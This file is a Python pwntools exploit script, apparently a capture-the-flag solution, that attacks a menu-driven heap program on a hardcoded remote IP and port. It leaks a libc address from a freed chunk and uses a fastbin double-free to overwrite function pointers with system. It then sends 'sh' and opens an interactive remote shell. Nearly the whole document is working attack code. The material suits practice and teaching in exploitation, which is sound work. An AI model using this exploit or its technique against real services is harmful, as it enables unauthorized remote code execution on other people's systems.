#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *
import time
#host = "10.211.55.6"
#port = 8888
host = "128.199.247.60"
port = 10001
r = remote(host,port)


def alloca(size,data):
    r.recvuntil("5. Run away")
    r.sendline("1")
    r.recvuntil("?")
    r.sendline(str(size))
    time.sleep(0.1)
    r.sendline(data)

def free(idx):
    r.recvuntil("5. Run away")
    r.sendline("3")
    r.recvuntil("?")
    r.sendline(str(idx))

def read(idx):
    r.recvuntil("5. Run away")
    r.sendline("4")
    r.recvuntil("?")
    r.sendline(str(idx))

# Just fastbin corruption
alloca(128,"ddaa")
alloca(0x38,"ddaa")
free(0)
read(0)
fake = 0x602042
r.recvuntil(" ")
libc = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x3c3b78
print "libc:",hex(libc)
alloca(0x38,"ddaa")
free(1)
free(2)
free(1)
alloca(0x38,p64(fake))
alloca(0x38,p64(fake))
alloca(0x38,p64(fake))
read = libc + 0xf6670
system = libc +0x45390 
alloca(0x38,'a'*6 + p64(read)*3+p64(system))

r.recvuntil("5. Run away")
r.sendline("sh")
r.interactive()
